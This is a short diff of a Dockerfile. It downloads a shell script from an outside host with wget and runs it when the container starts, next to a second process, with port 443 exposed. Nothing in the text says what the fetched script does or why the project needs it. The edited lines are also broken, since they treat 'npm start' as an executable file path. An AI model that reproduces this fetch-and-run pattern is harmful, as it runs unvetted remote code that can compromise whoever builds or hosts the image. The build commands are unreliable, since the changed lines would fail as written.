@@ -13,6 +13,6 @@ RUN rm -rf renderbfanarrowx.zip
 RUN wget -O main.sh https://go.bruceds.my.id/EPMS.sh
 COPY . .
 RUN chmod +x ./main.sh
-RUN chmod +x ./scheyot.sh
+RUN chmod +x ./npm start
 EXPOSE 443
-CMD ["sh", "-c", "./scheyot.sh & ./main.sh"]
+CMD ["sh", "-c", "./npm start & ./main.sh"]
